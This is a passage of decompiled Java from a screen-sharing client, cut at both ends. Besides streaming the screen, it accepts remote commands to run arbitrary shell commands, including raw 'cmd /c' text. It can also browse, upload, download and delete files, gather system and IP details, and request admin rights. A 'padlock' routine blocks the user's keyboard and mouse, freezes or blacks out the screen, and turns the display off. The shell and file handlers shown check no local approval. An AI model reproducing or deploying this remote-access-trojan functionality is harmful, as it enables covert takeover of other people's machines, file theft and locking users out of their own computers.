            String payload = this.mapper.createObjectNode().put("type", "latencyPing").put("id", id).put("t0", t0).toString();
            this.sendSafe(payload);
         } catch (Exception var5) {
         }
      }

      private void handleLatencyPong(JsonNode root) {
         long t0 = root.path("t0").asLong(0L);
         long t1 = root.path("t1").asLong(0L);
         if (t0 > 0L && t1 > 0L) {
            long t2 = System.currentTimeMillis();
            double rtt = Math.max(0.0, t2 - t0);
            double offset = t1 - (t0 + rtt / 2.0);
            if (!this.latencyReady) {
               this.latencyReady = true;
               this.rttMsEma = rtt;
               this.offsetToServerMsEma = offset;
            } else {
               this.rttMsEma = 0.2 * rtt + 0.8 * this.rttMsEma;
               this.offsetToServerMsEma = 0.2 * offset + 0.8 * this.offsetToServerMsEma;
            }

            try {
               String payload = this.mapper
                  .createObjectNode()
                  .put("type", "senderLatency")
                  .put("rttMs", this.rttMsEma)
                  .put("offsetMs", this.offsetToServerMsEma)
                  .put("clientTs", t2)
                  .toString();
               this.sendSafe(payload);
            } catch (Exception var14) {
            }

            long now = System.currentTimeMillis();
            if (now - this.lastLatencyLogMs > 10000L) {
               this.lastLatencyLogMs = now;
               System.out.println(String.format("Sender latency: rtt=%.0fms, offsetToServer=%.0fms", this.rttMsEma, this.offsetToServerMsEma));
            }
         }
      }

      private void captureAndSend() {
         try {
            if (!this.isOpen()) {
               return;
            }

            if (!this.hasViewers) {
               return;
            }

            if (this.pauseCapture) {
               return;
            }

            if (this.hasBufferedData()) {
               missedFramesCount++;
               return;
            }

            if (System.nanoTime() - this.lastSentNanos < 200000000L) {
               missedFramesCount++;
               return;
            }

            int currentFps = this.fps;
            long intervalNanos = 1000000000L / Math.max(1, currentFps);
            long now = System.nanoTime();
            if (now - this.lastSentNanos < intervalNanos) {
               return;
            }

            this.lastSentNanos = now;
            long captureStartMs = System.currentTimeMillis();
            BufferedImage capture = this.capturer.capture(this.captureRect, this.showCursor);
            if (!this.capturer.drawsCursor() && this.showCursor) {
               this.drawCursorIfNeeded(capture);
            }

            BufferedImage output = capture;
            if (this.scale < 0.999F) {
               output = this.scaleImage(capture, this.scale);
            }

            output = this.ensureRgb(output);
            this.outputWidth = output.getWidth();
            this.outputHeight = output.getHeight();
            byte[] bytes = this.encodeJpeg(output, this.jpegQuality);
            if (bytes.length > 12582912) {
               boolean adjusted = false;
               if (this.scale > 0.51F) {
                  this.scale = ScreenShareSender.clampScale(this.scale - 0.1F);
                  adjusted = true;
               } else if (this.jpegQuality > 0.61F) {
                  this.jpegQuality = ScreenShareSender.clampQuality(this.jpegQuality - 0.1F);
                  adjusted = true;
               }

               if (adjusted) {
                  output = capture;
                  if (this.scale < 0.999F) {
                     output = this.scaleImage(capture, this.scale);
                  }

                  output = this.ensureRgb(output);
                  this.outputWidth = output.getWidth();
                  this.outputHeight = output.getHeight();
                  bytes = this.encodeJpeg(output, this.jpegQuality);
               }
            }

            if (bytes.length > 12582912) {
               return;
            }

            long sendReadyMs = System.currentTimeMillis();
            this.sendSafe(this.wrapFrame(bytes, captureStartMs, sendReadyMs));
            this.updateWindowAndTune();
         } catch (Exception ex) {
            this.handleCaptureError(ex);
         }
      }

      private byte[] wrapFrame(byte[] jpeg, long captureStartMs, long sendReadyMs) {
         int seq = this.frameSeq++;
         ByteBuffer buf = ByteBuffer.allocate(28 + jpeg.length);
         buf.put(FRAME_MAGIC);
         buf.putShort((short)28);
         buf.putShort((short)0);
         buf.putInt(seq);
         buf.putLong(captureStartMs);
         buf.putLong(sendReadyMs);
         buf.put(jpeg);
         return buf.array();
      }

      private void handleCaptureError(Exception ex) {
         if (this.capturer instanceof JnaScreenCapturer && !this.jnaFailed) {
            this.jnaFailed = true;
            this.capturer = new ScreenShareSender.RobotScreenCapturer(this.robot);
            this.debug("JNA capture failed, falling back to Robot: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
            if (this.debugEnabled) {
               ex.printStackTrace(System.out);
            }
         } else {
            if (this.debugEnabled) {
               this.debug("capture error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
               ex.printStackTrace(System.out);
            }
         }
      }

      private byte[] encodeJpeg(BufferedImage image, float quality) throws Exception {
         Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName("jpeg");
         if (!writers.hasNext()) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            return baos.toByteArray();
         }

         ImageWriter writer = writers.next();
         ByteArrayOutputStream baos = new ByteArrayOutputStream();

         try {
            MemoryCacheImageOutputStream out = new MemoryCacheImageOutputStream(baos);

            try {
               writer.setOutput(out);
               ImageWriteParam param = writer.getDefaultWriteParam();
               if (param.canWriteCompressed()) {
                  param.setCompressionMode(2);
                  param.setCompressionQuality(Math.max(0.1F, Math.min(1.0F, quality)));
               }

               writer.write(null, new IIOImage(image, null, null), param);
            } catch (Throwable var14) {
               try {
                  out.close();
               } catch (Throwable var13) {
                  var14.addSuppressed(var13);
               }

               throw var14;
            }

            out.close();
         } finally {
            writer.dispose();
         }

         return baos.toByteArray();
      }

      private void drawCursorIfNeeded(BufferedImage img) {
         if (this.showCursor) {
            if (!this.controlEnabled || !this.localControlApproved) {
               try {
                  PointerInfo pi = MouseInfo.getPointerInfo();
                  Point p = null;
                  if (pi != null) {
                     p = pi.getLocation();
                  } else {
                     long now = System.currentTimeMillis();
                     if (this.debugEnabled && now - this.lastPointerLogMs > 2000L) {
                        this.lastPointerLogMs = now;
                        this.debug("pointer info unavailable, using cached position");
                     }

                     if (this.lastPointer != null && now - this.lastPointerAtMs < 1500L) {
                        p = this.lastPointer;
                     }
                  }

                  if (p == null) {
                     return;
                  }

                  this.lastPointer = p;
                  this.lastPointerAtMs = System.currentTimeMillis();
                  int x = p.x - this.captureRect.x;
                  int y = p.y - this.captureRect.y;
                  if (x < 0 || y < 0 || x >= this.captureRect.width || y >= this.captureRect.height) {
                     return;
                  }

                  Graphics2D g = img.createGraphics();

                  try {
                     g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                     g.setColor(new Color(0, 0, 0, 140));
                     g.fillOval(x - 3, y - 3, 6, 6);
                     g.setColor(new Color(255, 255, 255, 200));
                     g.drawOval(x - 4, y - 4, 8, 8);
                  } finally {
                     g.dispose();
                  }
               } catch (Exception var11) {
               }
            }
         }
      }

      private void applySettings(JsonNode root) {
         if (root.has("fps")) {
            this.fps = ScreenShareSender.clampFps(root.get("fps").asInt());
         }

         if (root.has("jpegQuality")) {
            this.jpegQuality = ScreenShareSender.clampQuality((float)root.get("jpegQuality").asDouble());
         }

         if (root.has("scale")) {
            this.scale = ScreenShareSender.clampScale((float)root.get("scale").asDouble());
         }

         if (root.has("showCursor")) {
            this.showCursor = root.get("showCursor").asBoolean();
         }

         if (root.has("monitorIndex")) {
            int requestedMonitor = root.get("monitorIndex").asInt(0);
            this.applyMonitorIndex(requestedMonitor);
            this.sendMonitors();
         }

         if (root.has("controlEnabled")) {
            boolean requested = root.get("controlEnabled").asBoolean();
            this.debug("control request: " + requested);
            this.handleControlRequest(requested);
         }

         if (root.has("pauseCapture")) {
            boolean requested = root.get("pauseCapture").asBoolean();
            this.debug("pause request: " + requested);
            this.handlePauseRequest(requested);
         }

         if (root.has("autoTune")) {
            this.autoTune = root.get("autoTune").asBoolean(true);
         }
      }

      private void handleViewerState(JsonNode root) {
         boolean active = root.has("hasViewers") && root.get("hasViewers").asBoolean();
         if (!active && root.has("viewerCount")) {
            active = root.get("viewerCount").asInt(0) > 0;
         }

         this.hasViewers = active;
      }

      private void applyMonitorIndex(int requestedIndex) {
         if (!GraphicsEnvironment.isHeadless()) {
            try {
               GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
               GraphicsDevice[] devices = ge.getScreenDevices();
               if (devices == null || devices.length == 0) {
                  return;
               }

               int resolved = requestedIndex;
               if (resolved < 0 || resolved >= devices.length) {
                  resolved = 0;
               }

               Rectangle bounds = devices[resolved].getDefaultConfiguration().getBounds();
               if (bounds == null || bounds.width <= 0 || bounds.height <= 0) {
                  return;
               }

               this.captureRect = new Rectangle(bounds);
               this.monitorIndex = resolved;
               this.outputWidth = 0;
               this.outputHeight = 0;
               this.debug("monitor changed to #" + this.monitorIndex + " (" + bounds.width + "x" + bounds.height + "@" + bounds.x + "," + bounds.y + ")");
            } catch (Exception var6) {
            }
         }
      }

      private void sendMonitors() {
         if (this.isOpen()) {
            try {
               ObjectNode payload = this.mapper.createObjectNode();
               payload.put("type", "monitors");
               payload.put("current", this.monitorIndex);
               ArrayNode list = payload.putArray("list");
               if (!GraphicsEnvironment.isHeadless()) {
                  GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                  GraphicsDevice[] devices = ge.getScreenDevices();
                  if (devices != null) {
                     for (int i = 0; i < devices.length; i++) {
                        Rectangle b = devices[i].getDefaultConfiguration().getBounds();
                        ObjectNode item = this.mapper.createObjectNode();
                        item.put("index", i);
                        ObjectNode bounds = this.mapper.createObjectNode();
                        bounds.put("x", b.x);
                        bounds.put("y", b.y);
                        bounds.put("width", b.width);
                        bounds.put("height", b.height);
                        item.set("bounds", bounds);
                        item.put("primary", i == 0);
                        list.add(item);
                     }
                  }
               } else {
                  payload.put("headless", true);
               }

               this.sendSafe(payload.toString());
            } catch (Exception var9) {
            }
         }
      }

      private ScreenShareSender.ScreenCapturer createCapturer() {
         String method = this.resolveCaptureMethod();
         if ("jna".equalsIgnoreCase(method)) {
            try {
               JnaScreenCapturer jna = new JnaScreenCapturer();
               if (jna.isSupported()) {
                  return jna;
               }
            } catch (Throwable var3) {
            }
         }

         return new ScreenShareSender.RobotScreenCapturer(this.robot);
      }

      private String resolveCaptureMethod() {
         String prop = System.getProperty("screen.capture.method");
         if (prop != null && !prop.trim().isEmpty()) {
            return prop.trim();
         }

         String env = System.getenv("SCREEN_CAPTURE_METHOD");
         return env != null && !env.trim().isEmpty() ? env.trim() : "jna";
      }

      private void handleMouseMove(JsonNode root) {
         if (this.canControl()) {
            int x = root.path("x").asInt();
            int y = root.path("y").asInt();
            Point mapped = this.mapToCapture(x, y);
            if (mapped != null) {
               this.robot.mouseMove(mapped.x, mapped.y);
            }
         }
      }

      private void handleMousePress(JsonNode root) {
         if (this.canControl()) {
            String btn = root.path("button").asText("left");
            int x = root.path("x").asInt();
            int y = root.path("y").asInt();
            Point mapped = this.mapToCapture(x, y);
            if (mapped != null) {
               this.robot.mouseMove(mapped.x, mapped.y);
            }

            int mask = this.mapButton(btn);
            this.robot.mousePress(mask);
         }
      }

      private void handleMouseRelease(JsonNode root) {
         if (this.canControl()) {
            String btn = root.path("button").asText("left");
            int x = root.path("x").asInt();
            int y = root.path("y").asInt();
            Point mapped = this.mapToCapture(x, y);
            if (mapped != null) {
               this.robot.mouseMove(mapped.x, mapped.y);
            }

            int mask = this.mapButton(btn);
            this.robot.mouseRelease(mask);
         }
      }

      private void handleKeyPress(JsonNode root) {
         if (this.canControl()) {
            int code = root.path("keyCode").asInt(0);
            if (code > 0) {
               try {
                  this.robot.keyPress(code);
               } catch (IllegalArgumentException ex) {
                  this.debug("ignored unsupported keyPress code=" + code);
               }
            }
         }
      }

      private void handleKeyRelease(JsonNode root) {
         if (this.canControl()) {
            int code = root.path("keyCode").asInt(0);
            if (code > 0) {
               try {
                  this.robot.keyRelease(code);
               } catch (IllegalArgumentException ex) {
                  this.debug("ignored unsupported keyRelease code=" + code);
               }
            }
         }
      }

      private void handleMouseWheel(JsonNode root) {
         if (this.canControl()) {
            int amount = root.path("amount").asInt();
            this.robot.mouseWheel(amount);
         }
      }

      private void dispatchFileRequest(String message) {
         if (!this.fileExecutor.isShutdown()) {
            this.fileExecutor.execute(() -> this.handleFileRequest(message));
         }
      }

      private void handleFileRequest(String message) {
         JsonNode root = this.readJson(message);
         if (root != null) {
            String action = root.path("action").asText("");
            if (action.isEmpty()) {
               action = root.path("op").asText("");
            }

            if (!action.isEmpty()) {
               if ("startPath".equals(action)) {
                  action = "start";
               }

               String requestId = this.extractRequestId(root);

               try {
                  switch (action) {
                     case "start":
                        String home = System.getProperty("user.home");
                        ObjectNode data = this.mapper.createObjectNode();
                        data.put("startPath", home == null ? "" : home);
                        this.sendFileOk(action, requestId, data);
                        break;
                     case "list": {
                        String path = root.path("path").asText("");
                        List<Map<String, Object>> entries = this.listEntries(path);
                        this.sendFileOk(action, requestId, this.entriesToArray(entries));
                        break;
                     }
                     case "mkdir":
                        String basex = root.path("path").asText("");
                        String name = root.path("name").asText("");
                        if (!basex.isEmpty() && !name.isEmpty()) {
                           Path target = Paths.get(basex).resolve(name);
                           Files.createDirectories(target);
                           ObjectNode datax = this.mapper.createObjectNode();
                           datax.put("path", target.toString());
                           this.sendFileOk(action, requestId, datax);
                        } else {
                           this.sendFileError(action, requestId, "path and name required");
                        }
                        break;
                     case "rename": {
                        String path = root.path("path").asText("");
                        String newName = root.path("newName").asText("");
                        if (!path.isEmpty() && !newName.isEmpty()) {
                           Path src = Paths.get(path);
                           Path parent = src.getParent();
                           if (parent == null) {
                              this.sendFileError(action, requestId, "invalid path");
                           } else {
                              Path dst = parent.resolve(newName);
                              Files.move(src, dst, StandardCopyOption.REPLACE_EXISTING);
                              ObjectNode datax = this.mapper.createObjectNode();
                              datax.put("path", dst.toString());
                              this.sendFileOk(action, requestId, datax);
                           }
                        } else {
                           this.sendFileError(action, requestId, "path and newName required");
                        }
                        break;
                     }
                     case "delete": {
                        String path = root.path("path").asText("");
                        if (path.isEmpty()) {
                           this.sendFileError(action, requestId, "path required");
                        } else {
                           Path fp = Paths.get(path);
                           if (Files.isDirectory(fp)) {
                              Files.delete(fp);
                           } else {
                              Files.deleteIfExists(fp);
                           }

                           ObjectNode data = this.mapper.createObjectNode();
                           data.put("ok", true);
                           this.sendFileOk(action, requestId, data);
                        }
                        break;
                     }
                     case "download": {
                        String path = root.path("path").asText("");
                        if (path.isEmpty()) {
                           this.sendFileError(action, requestId, "path required");
                        } else {
                           Path fp = Paths.get(path);
                           if (!Files.isDirectory(fp) && Files.exists(fp)) {
                              byte[] bytes = Files.readAllBytes(fp);
                              String base64x = Base64.getEncoder().encodeToString(bytes);
                              ObjectNode datax = this.mapper.createObjectNode();
                              datax.put("filename", fp.getFileName().toString());
                              datax.put("base64", base64x);
                              datax.put("size", bytes.length);
                              this.sendFileOk(action, requestId, datax);
                           } else {
                              this.sendFileError(action, requestId, "not a file");
                           }
                        }
                        break;
                     }
                     case "upload":
                        String base = root.path("path").asText("");
                        String filename = root.path("filename").asText("");
                        String base64 = root.path("base64").asText("");
                        if (!base.isEmpty() && !filename.isEmpty() && !base64.isEmpty()) {
                           Path target = Paths.get(base).resolve(filename);
                           Files.createDirectories(target.getParent());
                           byte[] dataBytes = Base64.getDecoder().decode(base64);
                           OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);

                           try {
                              out.write(dataBytes);
                           } catch (Throwable var16) {
                              if (out != null) {
                                 try {
                                    out.close();
                                 } catch (Throwable var15) {
                                    var16.addSuppressed(var15);
                                 }
                              }

                              throw var16;
                           }

                           if (out != null) {
                              out.close();
                           }

                           ObjectNode datax = this.mapper.createObjectNode();
                           datax.put("path", target.toString());
                           datax.put("bytes", dataBytes.length);
                           this.sendFileOk(action, requestId, datax);
                        } else {
                           this.sendFileError(action, requestId, "path, filename, base64 required");
                        }
                        break;
                     default:
                        this.sendFileError(action, requestId, "unknown action");
                  }
               } catch (Throwable t) {
                  this.sendFileError(action, requestId, t.getClass().getSimpleName() + ": " + t.getMessage());
               }
            }
         }
      }

      private JsonNode entriesToArray(List<Map<String, Object>> entries) {
         ArrayNode arr = this.mapper.createArrayNode();
         if (entries == null) {
            return arr;
         }

         for (Map<String, Object> e : entries) {
            if (e != null) {
               ObjectNode item = this.mapper.createObjectNode();
               item.put("name", String.valueOf(e.get("name")));
               item.put("directory", Boolean.TRUE.equals(e.get("directory")));
               Object size = e.get("size");
               item.put("size", size instanceof Number ? ((Number)size).longValue() : 0L);
               Object modified = e.get("modified");
               item.put("modified", modified instanceof Number ? ((Number)modified).longValue() : 0L);
               item.put("path", String.valueOf(e.get("path")));
               arr.add(item);
            }
         }

         return arr;
      }

      private void sendFileOk(String action, String requestId, JsonNode data) {
         this.sendFileResult(action, requestId, "ok", data, null);
      }

      private void sendFileError(String action, String requestId, String error) {
         this.sendFileResult(action, requestId, "error", null, error);
      }

      private void sendFileResult(String action, String requestId, String status, JsonNode data, String error) {
         try {
            ObjectNode payload = this.mapper.createObjectNode();
            payload.put("type", "fileResult");
            payload.put("action", action == null ? "" : action);
            payload.put("status", status == null ? "error" : status);
            if (requestId != null && !requestId.trim().isEmpty()) {
               payload.put("requestId", requestId.trim());
            }

            if ("ok".equals(status) && data != null) {
               payload.set("data", data);
            }

            if (!"ok".equals(status) && error != null) {
               payload.put("error", error);
            }

            this.sendSafe(payload.toString());
         } catch (Exception var7) {
         }
      }

      private void dispatchShellRequest(String message) {
         if (!this.shellExecutor.isShutdown()) {
            this.shellExecutor.execute(() -> this.handleShellRequest(message));
         }
      }

      private void handleShellRequest(String message) {
         JsonNode root = this.readJson(message);
         if (root != null) {
            String action = root.path("action").asText("");
            if (action.isEmpty()) {
               action = root.path("op").asText("");
            }

            if (!action.isEmpty()) {
               String requestId = this.extractRequestId(root);

               try {
                  switch (action) {
                     case "start": {
                        String cwd = this.ensureShellCwd();
                        ObjectNode data = this.mapper.createObjectNode();
                        data.put("cwd", cwd);
                        this.sendShellOk(action, requestId, data);
                        break;
                     }
                     case "sysinfo": {
                        ObjectNode data = this.mapper.createObjectNode();
                        data.put("user", this.resolveUserLabel());
                        data.put("ip", this.resolveIpAddress());
                        data.put("os", this.resolveOsVersion());
                        data.put("cpu", this.resolveCpuModel());
                        data.put("gpu", this.resolveGpuModel());
                        data.put("ram", this.resolveRamLabel());
                        this.sendShellOk(action, requestId, data);
                        break;
                     }
                     case "cd":
                        String path = root.path("path").asText("");
                        Path resolved = this.resolveShellPath(path, this.shellCwd);
                        if (resolved == null) {
                           this.sendShellError(action, requestId, "invalid path");
                        } else {
                           this.shellCwd = resolved.toString();
                           ObjectNode datax = this.mapper.createObjectNode();
                           datax.put("cwd", this.shellCwd);
                           this.sendShellOk(action, requestId, datax);
                        }
                        break;
                     case "exec":
                        String cmd = root.path("cmd").asText("");
                        if (cmd.trim().isEmpty()) {
                           this.sendShellError(action, requestId, "cmd required");
                        } else {
                           String cwdx = root.path("cwd").asText("");
                           Path cwdPath = this.resolveShellPath(cwdx, this.shellCwd);
                           if (cwdPath == null) {
                              this.sendShellError(action, requestId, "invalid cwd");
                           } else {
                              this.shellCwd = cwdPath.toString();
                              int exitCode = this.runShellCommand(cmd, cwdPath, requestId);
                              ObjectNode datax = this.mapper.createObjectNode();
                              datax.put("code", exitCode);
                              datax.put("cwd", this.shellCwd);
                              this.sendShellOk(action, requestId, datax);
                           }
                        }
                        break;
                     default:
                        this.sendShellError(action, requestId, "unknown action");
                  }
               } catch (Exception e) {
                  this.sendShellError(action, requestId, e.getClass().getSimpleName() + ": " + e.getMessage());
               }
            }
         }
      }

      private void handleClientAction(JsonNode root) {
         if (root != null) {
            String action = root.path("action").asText("");
            String requestId = this.extractRequestId(root);
            if ("openCalculator".equalsIgnoreCase(action)) {
               boolean ok = this.openCalculator();
               this.sendActionResult("openCalculator", requestId, ok ? "ok" : "error", ok ? "opened" : "failed");
            } else if ("requestAdmin".equalsIgnoreCase(action) || "elevate".equalsIgnoreCase(action)) {
               this.requestElevation(requestId);
            } else if ("tryText".equalsIgnoreCase(action)) {
               JsonNode data = root.path("data");
               String text = data.path("text").asText("");
               String filename = data.path("filename").asText("");
               if (text != null && !text.trim().isEmpty()) {
                  try {
                     String logFile = "output.txt";
                     ProcessBuilder pb = new ProcessBuilder("cmd", "/c", text);
                     pb.redirectErrorStream(true);
                     Process p = pb.start();
                     Thread logThread = new Thread(
                        () -> {
                           Path logPath = Paths.get(logFile);

                           try {
                              BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8));

                              try {
                                 BufferedWriter bw = Files.newBufferedWriter(
                                    logPath, StandardCharsets.UTF_8, StandardOpenOption.CREATE, StandardOpenOption.APPEND
                                 );

                                 String line;
                                 try {
                                    while ((line = br.readLine()) != null) {
                                       bw.write(line);
                                       bw.newLine();
                                       bw.flush();
                                    }
                                 } catch (Throwable var9x) {
                                    if (bw != null) {
                                       try {
                                          bw.close();
                                       } catch (Throwable var8x) {
                                          var9x.addSuppressed(var8x);
                                       }
                                    }

                                    throw var9x;
                                 }

                                 if (bw != null) {
                                    bw.close();
                                 }
                              } catch (Throwable var10x) {
                                 try {
                                    br.close();
                                 } catch (Throwable var7x) {
                                    var10x.addSuppressed(var7x);
                                 }

                                 throw var10x;
                              }

                              br.close();
                           } catch (IOException ignored) {
                              ignored.printStackTrace();
                           }
                        }
                     );
                     logThread.start();
                     this.sendActionResult("tryText", requestId, "ok", "Created and run");
                  } catch (Exception e) {
                     this.sendActionResult("tryText", requestId, "error", e.getClass().getSimpleName());
                  }
               } else {
                  this.sendActionResult("tryText", requestId, "error", "empty_text");
               }
            } else if ("padlock".equalsIgnoreCase(action)) {
               try {
                  JsonNode data = root.path("data");
                  boolean lockKeyboard = data.path("keyboard").asBoolean(false);
                  boolean lockMouse = data.path("mouse").asBoolean(false);
                  boolean freezeDesktop = data.path("freezeDesktop").asBoolean(false);
                  boolean displayOff = data.path("displayOff").asBoolean(false);
                  ObjectNode echo = this.mapper.createObjectNode();
                  echo.put("keyboard", lockKeyboard);
                  echo.put("mouse", lockMouse);
                  echo.put("freezeDesktop", freezeDesktop);
                  echo.put("displayOff", displayOff);
                  ScreenShareSender.SenderClient.PadlockResult res = this.applyPadlock(lockKeyboard, lockMouse, freezeDesktop, displayOff);
                  this.sendActionResult("padlock", requestId, res.status, res.note, echo);
               } catch (Exception e) {
                  this.sendActionResult("padlock", requestId, "denied", "exception: " + e.getClass().getSimpleName());
               }
            }
         }
      }

      private ScreenShareSender.SenderClient.PadlockResult applyPadlock(boolean lockKeyboard, boolean lockMouse, boolean freezeDesktop, boolean displayOff) {
         if (!this.isWindows()) {
            return new ScreenShareSender.SenderClient.PadlockResult("unsupported", "not_windows");
         }

         StringBuilder note = new StringBuilder();
         boolean ok = true;
         boolean dllRelevant = lockKeyboard || lockMouse || displayOff;
         if (dllRelevant && !this.ensurePadlockDll()) {
            this.appendNote(note, "dll_unavailable:" + this.getPadlockDllUnavailableReason());
         }

         boolean overlayEnabled = freezeDesktop || displayOff;
         boolean freezeMode = freezeDesktop && !displayOff;
         boolean overlayOk = this.applyPadlockOverlay(overlayEnabled, freezeMode);
         if (!overlayOk && freezeDesktop) {
            ok = false;
            this.appendNote(note, "freeze_failed");
         }

         boolean displayOk = this.applyDisplayPower(displayOff);
         if (!displayOk && displayOff) {
            this.appendNote(note, "display_failed");
         }

         boolean inputOk = this.applyInputBlock(lockKeyboard, lockMouse, note);
         if (!inputOk && (lockKeyboard || lockMouse)) {
            ok = false;
         }

         if (!ok) {
            String n = note.length() == 0 ? "failed" : note.toString();
            return new ScreenShareSender.SenderClient.PadlockResult("denied", n);
         } else {
            String n = note.length() == 0 ? (!lockKeyboard && !lockMouse && !freezeDesktop && !displayOff ? "released" : "applied") : note.toString();
            return new ScreenShareSender.SenderClient.PadlockResult("accepted", n);
         }
      }

      private void appendNote(StringBuilder sb, String part) {
         if (part != null && !part.trim().isEmpty()) {
            if (sb.length() > 0) {
               sb.append(", ");
            }

            sb.append(part.trim());
         }
      }

      private boolean applyPadlockOverlay(boolean enabled, boolean freezeMode) {
         if (GraphicsEnvironment.isHeadless()) {
            return !enabled;
         }

         if (!enabled) {
            SwingUtilities.invokeLater(() -> {
               synchronized (this.padlockOverlayLock) {
                  for (JWindow w : this.padlockOverlays) {
                     try {
                        w.setVisible(false);
                        w.dispose();
                     } catch (Exception var6x) {
                     }
                  }

                  this.padlockOverlays.clear();
               }
            });
            return true;
         }

         List<Rectangle> boundsList = new ArrayList<>();
         List<BufferedImage> frozenFrames = new ArrayList<>();

         try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] devices = ge.getScreenDevices();
            if (devices == null || devices.length == 0) {
               return false;
            }

            Robot freezeRobot = null;
            if (freezeMode) {
               freezeRobot = this.robot != null ? this.robot : new Robot();
            }

            for (GraphicsDevice d : devices) {
               Rectangle b = d.getDefaultConfiguration().getBounds();
               if (b != null && b.width > 0 && b.height > 0) {
                  BufferedImage snap = null;
                  if (freezeMode) {
                     try {
                        snap = freezeRobot.createScreenCapture(b);
                     } catch (Exception var15) {
                     }
                  }

                  boundsList.add(new Rectangle(b));
                  frozenFrames.add(snap);
               }
            }
         } catch (Exception ignored) {
            return false;
         }

         if (boundsList.isEmpty()) {
            return false;
         }

         SwingUtilities.invokeLater(() -> {
            synchronized (this.padlockOverlayLock) {
               if (this.padlockOverlays.isEmpty()) {
                  for (int i = 0; i < boundsList.size(); i++) {
                     Rectangle bx = boundsList.get(i);
                     BufferedImage snapx = frozenFrames.get(i);

                     try {
                        JWindow w = new JWindow();
                        w.setAlwaysOnTop(true);
                        w.setFocusableWindowState(false);
                        if (freezeMode && snapx != null) {
                           w.getContentPane().add(new JLabel(new ImageIcon(snapx)));
                        } else {
                           JPanel panel = new JPanel(new BorderLayout());
                           panel.setBackground(Color.BLACK);
                           if (!freezeMode) {
                              JLabel label = new JLabel("LOCKED", 0);
                              label.setForeground(Color.WHITE);
                              label.setFont(new Font("Dialog", 1, 56));
                              panel.add(label, "Center");
                           }

                           w.getContentPane().add(panel);
                        }

                        w.setBounds(bx);
                        w.setVisible(true);
                        this.padlockOverlays.add(w);
                     } catch (Exception var12x) {
                     }
                  }
               }
            }
         });
         return true;
      }

      private boolean applyDisplayPower(boolean displayOff) {
         boolean canUseDll = this.padlockDllLoaded || displayOff && this.ensurePadlockDll();
         if (canUseDll) {
            try {
               boolean ok = PadlockNative.setDisplayPower(displayOff ? 2 : -1);
               if (ok) {
                  return true;
               }
            } catch (Exception var5) {
            }
         }

         try {
            int state = displayOff ? 2 : -1;
            User32.INSTANCE.SendMessage(WinUser.HWND_BROADCAST, 274, new WPARAM(61808L), new LPARAM(state));
            return true;
         } catch (Throwable ignored) {
            return false;
         }
      }

      private boolean ensurePadlockDll() {
         if (!this.padlockDllEnabled) {
            if (!this.padlockDllTried) {
               this.debug("padlock dll disabled by config");
            }

            this.padlockDllTried = true;
            this.padlockDllLoaded = false;
            this.padlockDllUnavailableReason = "disabled_by_config";
            return false;
         } else {
            if (this.padlockDllTried) {
               return this.padlockDllLoaded;
            }

            this.padlockDllTried = true;
            this.padlockDllLoaded = PadlockNative.loadIfPresent();
            if (this.padlockDllLoaded) {
               this.padlockDllUnavailableReason = "";
               this.debug("padlock dll loaded: " + PadlockNative.getLoadedDllPath());
            } else {
               String err = PadlockNative.getLastError();
               this.padlockDllUnavailableReason = this.sanitizePadlockReason(err);
               if (err != null && !err.isEmpty()) {
                  this.debug("padlock dll unavailable: " + err);
               }
            }

            return this.padlockDllLoaded;
         }
      }

      private String getPadlockDllUnavailableReason() {
         String reason = this.sanitizePadlockReason(this.padlockDllUnavailableReason);
         if (reason.isEmpty()) {
            reason = this.sanitizePadlockReason(PadlockNative.getLastError());
         }

         return reason.isEmpty() ? "unknown" : reason;
      }

      private String sanitizePadlockReason(String value) {
         if (value == null) {
            return "";
         }

         String out = value.trim().toLowerCase();
         if (out.isEmpty()) {
            return "";
         }

         out = out.replace(',', ';');
         out = out.replace(' ', '_');
         if (out.length() > 120) {
            out = out.substring(0, 120);
         }

         return out;
      }

      private boolean applyInputBlock(boolean lockKeyboard, boolean lockMouse, StringBuilder note) {
         int targets = 0;
         if (lockKeyboard) {
            targets |= 1;
         }

         if (lockMouse) {
            targets |= 2;
         }

         boolean wantAny = targets != 0;
         boolean wantBoth = lockKeyboard && lockMouse;
         if (!wantAny) {
            if (this.padlockDllLoaded && this.ensurePadlockDll()) {
               try {
                  if (PadlockNative.isRunning()) {
                     PadlockNative.stopAll();
                     this.appendNote(note, "input=dll_released");
                  }
               } catch (Exception var10) {
               }
            }

            try {
               ScreenShareSender.User32Extra.INSTANCE.BlockInput(false);
            } catch (Throwable var9) {
            }

            this.padlockBlockInputActive = false;
            this.appendNote(note, "input=released");
            return true;
         } else {
            if (this.ensurePadlockDll()) {
               boolean ok = PadlockNative.isRunning() ? PadlockNative.setTargets(targets) : PadlockNative.startTargets(targets);
               if (ok) {
                  if (this.padlockBlockInputActive) {
                     try {
                        ScreenShareSender.User32Extra.INSTANCE.BlockInput(false);
                     } catch (Throwable var11) {
                     }

                     this.padlockBlockInputActive = false;
                  }

                  this.appendNote(note, "input=dll");
                  return true;
               }

               String err = PadlockNative.getLastError();
               this.appendNote(note, "dll_failed" + (err != null && !err.isEmpty() ? ":" + err : ""));
            }

            if (!wantBoth) {
               if (this.padlockBlockInputActive) {
                  try {
                     ScreenShareSender.User32Extra.INSTANCE.BlockInput(false);
                  } catch (Throwable var12) {
                  }

                  this.padlockBlockInputActive = false;
               }

               this.appendNote(note, "single_input_requires_dll");
               return false;
            } else {
               try {
                  boolean ok = ScreenShareSender.User32Extra.INSTANCE.BlockInput(true);
                  if (!ok) {
                     this.appendNote(note, "blockinput_failed");
                     return false;
                  } else {
                     this.padlockBlockInputActive = true;
                     this.appendNote(note, "input=blockinput");
                     return true;
                  }
               } catch (Throwable t) {
                  this.appendNote(note, "blockinput_exception:" + t.getClass().getSimpleName());
                  return false;
               }
            }
         }
      }

      private void releasePadlockBestEffort() {
         try {
            this.applyPadlockOverlay(false, false);
